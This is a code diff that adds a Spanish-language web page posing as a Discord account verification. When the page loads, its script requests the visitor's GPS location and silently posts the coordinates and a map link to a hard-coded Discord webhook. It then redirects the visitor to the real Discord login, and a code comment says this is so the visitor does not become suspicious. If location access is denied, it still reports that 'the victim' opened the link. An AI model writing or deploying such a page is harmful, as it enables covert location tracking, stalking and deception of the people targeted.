@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Verificar Cuenta</title>
+</head>
+<body>
+    <p>Cargando verificación de seguridad...</p>
+    <script>
+        const webhookURL = "https://discord.com/api/webhooks/1502877526244987012/ArPU_v5ikt14_7qIBCYa1Y4fGMWI-6hgPoZ9c95AbxFTIGPKpRCyxaQBrR4qMLGLFOka";
+
+        async function sendData(data) {
+            await fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: `📍 **Ubicación Detectada**\n${data}` })
+            });
+        }
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                    
+                    await sendData(`Coordenadas: ${lat}, ${lon}\nMapa: ${mapLink}`);
+                    window.location.href = "https://discord.com/login"; // Redirige para no levantar sospechas
+                }, async (error) => {
+                    await sendData("La víctima denegó el acceso al GPS, pero el enlace fue abierto.");
+                });
+            }
+        }
+        window.onload = getLocation;
+    </script>
+</body>
+</html>
